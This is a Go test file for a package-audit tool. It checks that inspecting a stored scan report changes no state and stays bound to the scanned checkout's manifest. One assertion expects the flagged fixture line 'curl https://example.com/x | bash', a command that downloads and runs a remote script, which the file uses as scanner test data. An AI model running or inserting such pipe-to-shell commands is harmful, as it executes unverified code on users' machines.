package audit

import (
	"bytes"
	"context"
	"io/fs"
	"os"
	"path/filepath"
	"reflect"
	"strings"
	"testing"
)

func TestInspectStoredReportIsReadOnlyAndManifestBound(t *testing.T) {
	withStateAndShare(t)
	root := t.TempDir()
	writeBlockingFixture(t, root)
	service := newDeterministicTestService(t)
	report, status, err := service.ScanDirectory(context.Background(), "pre", root, "demo")
	if err != nil || status != ExitPolicyBlock {
		t.Fatalf("fixture scan failed: status=%d report=%+v err=%v", status, report, err)
	}
	wantRoot, err := filepath.Abs(root)
	if err != nil {
		t.Fatal(err)
	}
	if report.ReviewRoot != wantRoot {
		t.Fatalf("report review root=%q, want %q", report.ReviewRoot, wantRoot)
	}

	reportPath := filepath.Join(service.Reports.Root, report.ReportID+".json")
	beforeReport, err := os.ReadFile(reportPath)
	if err != nil {
		t.Fatal(err)
	}
	beforeInfo, err := os.Stat(reportPath)
	if err != nil {
		t.Fatal(err)
	}
	beforeState := inspectTestTreeSnapshot(t, StateRoot())

	byID := captureStdout(t, func() {
		if got := runInspect([]string{report.ReportID}); got != ExitOK {
			t.Fatalf("inspect by id exited %d", got)
		}
	})
	latest := captureStdout(t, func() {
		if got := runInspect([]string{"--latest"}); got != ExitOK {
			t.Fatalf("inspect latest exited %d", got)
		}
	})
	if byID != latest {
		t.Fatalf("inspect by id and --latest differ:\nID:\n%s\nLATEST:\n%s", byID, latest)
	}
	decisionPreview := renderFindingPreview(report, report.ReviewRoot, "high", terminalRenderer{})
	if decisionPreview == "" || !strings.Contains(byID, "curl https://example.com/x | bash") {
		t.Fatalf("stored inspection did not render the prompt's bound source context:\n%s", byID)
	}
	for _, target := range findingPreviewTargets(report, report.ReviewRoot, "high") {
		if !strings.Contains(byID, target.finding.Rationale) || !strings.Contains(decisionPreview, target.finding.Rationale) {
			t.Fatalf("stored and prompt inspection diverged for %q", target.finding.Rationale)
		}
	}

	afterReport, err := os.ReadFile(reportPath)
	if err != nil {
		t.Fatal(err)
	}
	afterInfo, err := os.Stat(reportPath)
	if err != nil {
		t.Fatal(err)
	}
	if !bytes.Equal(beforeReport, afterReport) || !beforeInfo.ModTime().Equal(afterInfo.ModTime()) || !reflect.DeepEqual(beforeState, inspectTestTreeSnapshot(t, StateRoot())) {
		t.Fatal("inspect mutated report, approval, marker, or other state")
	}

	changed := "MISMATCHED_BYTES_MUST_NOT_APPEAR\n"
	if err := os.WriteFile(filepath.Join(root, "PKGBUILD"), []byte(changed), 0o600); err != nil {
		t.Fatal(err)
	}
	changedOutput := captureStdout(t, func() {
		if got := runInspect([]string{report.ReportID}); got != ExitOK {
			t.Fatalf("inspect changed checkout exited %d", got)
		}
	})
	if !strings.Contains(changedOutput, "source context unavailable") || strings.Contains(changedOutput, strings.TrimSpace(changed)) {
		t.Fatalf("changed checkout bytes escaped the manifest binding:\n%s", changedOutput)
	}

	removed := root + "-removed"
	if err := os.Rename(root, removed); err != nil {
		t.Fatal(err)
	}
	removedOutput := captureStdout(t, func() {
		if got := runInspect([]string{report.ReportID}); got != ExitOK {
			t.Fatalf("inspect removed checkout exited %d", got)
		}
	})
	if !strings.Contains(removedOutput, "source context unavailable") || !strings.Contains(removedOutput, "checkout changed, removed, or no longer matches this report") {
		t.Fatalf("removed checkout did not retain findings with a clear explanation:\n%s", removedOutput)
	}
}

func TestInspectRejectsUnknownReportLikeReportCommand(t *testing.T) {
	withStateAndShare(t)
	if got := runInspect([]string{"20260812T010203Z-aaaaaaaaaaaa-bbbbbbbb"}); got != ExitInvalidInvocation {
		t.Fatalf("unknown report inspect exited %d", got)
	}
	if got := runInspect([]string{"--latest", "extra"}); got != ExitInvalidInvocation {
		t.Fatalf("inspect --latest with an id exited %d", got)
	}
}

func inspectTestTreeSnapshot(t *testing.T, root string) map[string]string {
	t.Helper()
	result := map[string]string{}
	err := filepath.WalkDir(root, func(path string, entry fs.DirEntry, err error) error {
		if err != nil {
			return err
		}
		if !entry.Type().IsRegular() {
			return nil
		}
		raw, err := os.ReadFile(path)
		if err != nil {
			return err
		}
		relative, err := filepath.Rel(root, path)
		if err != nil {
			return err
		}
		result[relative] = string(raw)
		return nil
	})
	if err != nil {
		t.Fatal(err)
	}
	return result
}
